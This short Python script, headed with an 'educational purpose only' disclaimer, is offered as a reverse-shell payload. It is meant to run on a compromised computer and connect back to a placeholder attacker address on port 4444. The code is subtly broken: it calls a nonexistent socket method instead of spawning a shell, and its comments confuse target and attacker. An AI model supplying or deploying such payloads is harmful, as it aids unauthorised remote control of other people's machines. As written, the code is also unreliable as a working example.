# FOR EDUCATIONNAL PURPOSE ONLY
# I AM NOT RESPONSIBLE FOR ANY BAD USAGE OF THIS SCRIPT.

import socket
# from The Target Computer, after the exploit has been executed, this script will be run to create a reverse shell back to the attacker's machine.
# Define the host and port where the reverse shell will connect to
host = "your_attacker_ip"
port = 4444

def create_reverse_shell():
    # Create a socket object
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    try:
        # Connect to the target machine and establish a reverse shell
        s.connect((host, port))
        s.interactive()
    except Exception as e:
        print("Error:", e)

# Call the function to create the reverse shell
create_reverse_shell()
